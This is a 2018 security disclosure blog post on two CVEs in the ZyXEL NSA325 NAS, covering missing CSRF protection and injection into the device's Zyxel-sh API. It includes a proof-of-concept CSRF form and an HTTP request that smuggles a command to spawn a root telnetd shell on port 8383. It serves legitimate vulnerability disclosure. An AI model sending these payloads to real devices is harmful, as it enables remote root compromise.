=== Content from blog.securityevaluators.com_3e8669c0_20250124_212047.html ===
[Open in app](https://rsci.app.link/?%24canonical_url=https%3A%2F%2Fmedium.com%2Fp%2F945481a699b8&%7Efeature=LoOpenInAppButton&%7Echannel=ShowPostUnderCollection&source=---top_nav_layout_nav----------------------------------)

[Sign up](https://medium.com/m/signin?operation=register&redirect=https%3A%2F%2Fblog.securityevaluators.com%2Fise-labs-finds-vulnerabilities-in-zyxel-nsa325-945481a699b8&source=post_page---top_nav_layout_nav-----------------------global_nav-----------)

[Sign in](https://medium.com/m/signin?operation=login&redirect=https%3A%2F%2Fblog.securityevaluators.com%2Fise-labs-finds-vulnerabilities-in-zyxel-nsa325-945481a699b8&source=post_page---top_nav_layout_nav-----------------------global_nav-----------)

[Write](https://medium.com/m/signin?operation=register&redirect=https%3A%2F%2Fmedium.com%2Fnew-story&source=---top_nav_layout_nav-----------------------new_post_topnav-----------)

[Sign up](https://medium.com/m/signin?operation=register&redirect=https%3A%2F%2Fblog.securityevaluators.com%2Fise-labs-finds-vulnerabilities-in-zyxel-nsa325-945481a699b8&source=post_page---top_nav_layout_nav-----------------------global_nav-----------)

[Sign in](https://medium.com/m/signin?operation=login&redirect=https%3A%2F%2Fblog.securityevaluators.com%2Fise-labs-finds-vulnerabilities-in-zyxel-nsa325-945481a699b8&source=post_page---top_nav_layout_nav-----------------------global_nav-----------)

![](https://miro.medium.com/v2/resize:fill:64:64/1*dmbNkD5D-u45r44go_cf0g.png)
# ISE Labs Finds Vulnerabilities in ZyXEL NSA325

## 2 CVEs awarded to ISE Labs for new vulnerabilities.

[![Ian Sindermann](https://miro.medium.com/v2/resize:fill:88:88/1*XANnByx7N50Ud23w_7oQ_g.jpeg)](https://medium.com/%40isindermann?source=post_page---byline--945481a699b8--------------------------------)[![Independent Security Evaluators](https://miro.medium.com/v2/resize:fill:48:48/1*zlPb8cRt0y45p5s2efL2uw.png)](https://blog.securityevaluators.com/?source=post_page---byline--945481a699b8--------------------------------)

[Ian Sindermann](https://medium.com/%40isindermann?source=post_page---byline--945481a699b8--------------------------------)

·

[Follow](https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fsubscribe%2Fuser%2Fce0ca88b216f&operation=register&redirect=https%3A%2F%2Fblog.securityevaluators.com%2Fise-labs-finds-vulnerabilities-in-zyxel-nsa325-945481a699b8&user=Ian+Sindermann&userId=ce0ca88b216f&source=post_page-ce0ca88b216f--byline--945481a699b8---------------------post_header-----------)

Published in[Independent Security Evaluators](https://blog.securityevaluators.com/?source=post_page---byline--945481a699b8--------------------------------)·2 min read·Nov 2, 2018

--

Listen

Share

This post details the vulnerabilities discovered by ISE Labs affecting the ZyXEL NSA325 NAS. Although sparse, these vulnerabilities may allow attackers to completely compromise the device remotely.

## **Missing Request Origin Verification Functionality** (CVE-2018–14892)

The Zyxel device makes use of session tokens for authentication and is accessible from a browser. We noted that the application does not take any measures to prevent CSRF attacks where the user is tricked into issuing a state changing request by means of the browser’s automatic cookie submission functionality on cross-origin requests. The PoC code below disables telnet on the user’s behalf when the “submit” button is clicked. A similar attack can be used to exploit the command injection vulnerability outlined in “Low-Privilege Root Command Injection via API”. We also noted that the same functionality can be used to create users in the system.

```
<html>
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://10.42.4.142/r51009,/adv,/cgi-bin/zysh-cgi" method="POST">
      <input type="hidden" name="write" value="1" />
      <input type="hidden" name="c0" value="configure&#32;terminal&#32;telnet&#32;stop" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>
```
## **Root Command Injection via API (CVE-2018–14893)**

Many portions of the device’s API (`/cmd,/.*`) pass user input to `zyshclient`, a proprietary command-line interface. Although user input is passed to this binary via a pipe, avoiding conventional command injection risks, the Zyxel-sh language itself is also vulnerable to injection. As a result, low privilege users may pass command injection attacks that execute unexpected Zyxel-sh commands, such as `package`, which allows execution of arbitrary system commands as root.

Additionally, other vulnerabilities (see “Missing Request Origin Verification Functionality”) may allow unauthenticated attackers to exploit this vulnerability remotely.

Using this vulnerability, a low privilege user may spawn an unauthenticated `telnetd` server on port 8383 via a request similar to the following:

```
POST /cmd,/ck6fup6/fileBrowser_main/browse HTTP/1.1
Host: 192.168.1.86
Content-Length: 103
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Accept: */*
Cookie: authtok=SlB+4SZYBZsG8ik7d8-me+8CuPltIjaWxtssOipsIU1+vyM7eTsWESHqBTxNmH+X
Connection: closeshare=public&path=%2Fbork"+%3b+package+telnetd+-l+/bin/sh+-p+8383+%3b+dir+"/&start=0&limit=26&view=grid
```
![]()
## Responsible Disclosure Timeline

* **July 25, 2018:** Contacted ZyXel.
* **July 26, 2018:** Response from ZyXel where they inform us that this is an end-of-life model.

*Ian Sindermann, Associate Security Analyst at* [*Independent Security Evaluators*](http://securityevaluators.com)

*Twitters:* [*@ISESecurity*](https://twitter.com/ISEsecurity) *@extantbogon*

[**Sign up to get our latest blogs.**](http://eepurl.com/bLc2bf)

[Web Development](https://medium.com/tag/web-development?source=post_page-----945481a699b8--------------------------------)[IoT](https://medium.com/tag/iot?source=post_page-----945481a699b8--------------------------------)[Hacking](https://medium.com/tag/hacking?source=post_page-----945481a699b8--------------------------------)[Ise Labs](https://medium.com/tag/ise-labs?source=post_page-----945481a699b8--------------------------------)[Cybersecurity](https://medium.com/tag/cybersecurity?source=post_page-----945481a699b8--------------------------------)

--

--

[![Independent Security Evaluators](https://miro.medium.com/v2/resize:fill:96:96/1*zlPb8cRt0y45p5s2efL2uw.png)](https://blog.securityevaluators.com/?source=post_page---post_publication_info--945481a699b8--------------------------------)[![Independent Security Evaluators](https://miro.medium.com/v2/resize:fill:128:128/1*zlPb8cRt0y45p5s2efL2uw.png)](https://blog.securityevaluators.com/?source=post_page---post_publication_info--945481a699b8--------------------------------)[Follow](https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fsubscribe%2Fcollection%2Findependent-security-evaluators&operation=register&redirect=https%3A%2F%2Fblog.securityevaluators.com%2Fise-labs-finds-vulnerabilities-in-zyxel-nsa325-945481a699b8&collection=Independent+Security+Evaluators&collectionId=85ea1a550e4c&source=post_page---post_publication_info--945481a699b8---------------------follow_profile-----------)[## Published in Independent Security Evaluators](https://blog.securityevaluators.com/?source=post_page---post_publication_info--945481a699b8--------------------------------)[1K Followers](/followers?source=post_page---post_publication_info--945481a699b8--------------------------------)·[Last published Mar 7, 2022](/reading-hackable-without-a-background-in-security-a22ebe59b3e8?source=post_page---post_publication_info--945481a699b8--------------------------------)

Security specialists that provide custom services including security assessments and software development. ISE also runs IoT Village, which hosts talks by expert security researchers and hacking contests.

[Follow](https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fsubscribe%2Fcollection%2Findependent-security-evaluators&operation=register&redirect=https%3A%2F%2Fblog.securityevaluators.com%2Fise-labs-finds-vulnerabilities-in-zyxel-nsa325-945481a699b8&collection=Independent+Security+Evaluators&collectionId=85ea1a550e4c&source=post_page---post_publication_info--945481a699b8---------------------follow_profile-----------)[![Ian Sindermann](https://miro.medium.com/v2/resize:fill:96:96/1*XANnByx7N50Ud23w_7oQ_g.jpeg)](https://medium.com/%40isindermann?source=post_page---post_author_info--945481a699b8--------------------------------)[![Ian Sindermann](https://miro.medium.com/v2/resize:fill:128:128/1*XANnByx7N50Ud23w_7oQ_g.jpeg)](https://medium.com/%40isindermann?source=post_page---post_author_info--945481a699b8--------------------------------)[Follow](https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fsubscribe%2Fuser%2Fce0ca88b216f&operation=register&redirect=https%3A%2F%2Fblog.securityevaluators.com%2Fise-labs-finds-vulnerabilities-in-zyxel-nsa325-945481a699b8&user=Ian+Sindermann&userId=ce0ca88b216f&source=post_page-ce0ca88b216f--post_author_info--945481a699b8---------------------follow_profile-----------)[## Written by Ian Sindermann](https://medium.com/%40isindermann?source=post_page---post_author_info--945481a699b8--------------------------------)[6 Followers](https://medium.com/%40isindermann/followers?source=post_page---post_author_info--945481a699b8--------------------------------)·[1 Following](https://medium.com/%40isindermann/following?source=post_page---post_author_info--945481a699b8--------------------------------)[Follow](https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fsubscribe%2Fuser%2Fce0ca88b216f&operation=register&redirect=https%3A%2F%2Fblog.securityevaluators.com%2Fise-labs-finds-vulnerabilities-in-zyxel-nsa325-945481a699b8&user=Ian+Sindermann&userId=ce0ca88b216f&source=post_page-ce0ca88b216f--post_author_info--945481a699b8---------------------follow_profile-----------)
## No responses yet

[Help](https://help.medium.com/hc/en-us?source=post_page-----945481a699b8--------------------------------)[Status](https://medium.statuspage.io/?source=post_page-----945481a699b8--------------------------------)[About](https://medium.com/about?autoplay=1&source=post_page-----945481a699b8--------------------------------)[Careers](https://medium.com/jobs-at-medium/work-at-medium-959d1a85284e?source=post_page-----945481a699b8--------------------------------)[Press](pressinquiries%40medium.com?source=post_page-----945481a699b8--------------------------------)[Blog](https://blog.medium.com/?source=post_page-----945481a699b8--------------------------------)[Privacy](https://policy.medium.com/medium-privacy-policy-f03bf92035c9?source=post_page-----945481a699b8--------------------------------)[Terms](https://policy.medium.com/medium-terms-of-service-9db0094a1e0f?source=post_page-----945481a699b8--------------------------------)[Text to speech](https://speechify.com/medium?source=post_page-----945481a699b8--------------------------------)[Teams](https://medium.com/business?source=post_page-----945481a699b8--------------------------------)


